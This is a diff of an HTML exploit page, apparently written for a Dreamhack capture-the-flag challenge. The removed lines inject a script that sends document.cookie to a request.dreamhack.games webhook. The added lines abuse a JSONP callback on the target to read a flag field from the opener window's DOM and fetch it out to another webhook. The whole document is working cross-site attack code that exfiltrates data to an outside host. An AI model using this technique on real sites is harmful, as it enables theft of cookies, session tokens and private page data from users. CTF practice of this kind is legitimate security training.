@@ -1,10 +1,24 @@
-<!doctype html><meta charset="utf-8"><title>stage2</title>
+<!doctype html>
+<meta charset="utf-8">
 <script>
-(function () {
-  fetch('http://127.0.0.1:3000/vuln?content=' + encodeURIComponent(
-    "<script>new Image().src='https://ccvinnw.request.dreamhack.games/hit?c='+encodeURIComponent(document.cookie)</" + "script>"
-  ), { mode: 'no-cors' });
+const victim = 'http://home:8001';
+const webhook = 'https://hbzagyq.request.dreamhack.games/x';
 
-  location.href = "http://127.0.0.1:3000/login";
-})();
+const helper = window.open('about:blank', 'helper');
+
+// function that will later run inside /callback (SentenceNet origin)
+helper.stealFlag = async function (_) {
+  // wait until the opener (main window) finished loading /post
+  while (!helper.opener.document || !helper.opener.document.querySelector('#info_value')) {
+    await new Promise(r => setTimeout(r, 100));
+  }
+  const flag = helper.opener.document.querySelector('#info_value').value;
+  await fetch(webhook + '?f=' + encodeURIComponent(flag));
+};
+
+// send the helper window to the JSONP endpoint with our callback name
+helper.location = victim + '/callback?callback=stealFlag';
+
+// navigate the main window to /post so the flag is injected into the input element
+setTimeout(() => { window.location = victim + '/post'; }, 200);
 </script>
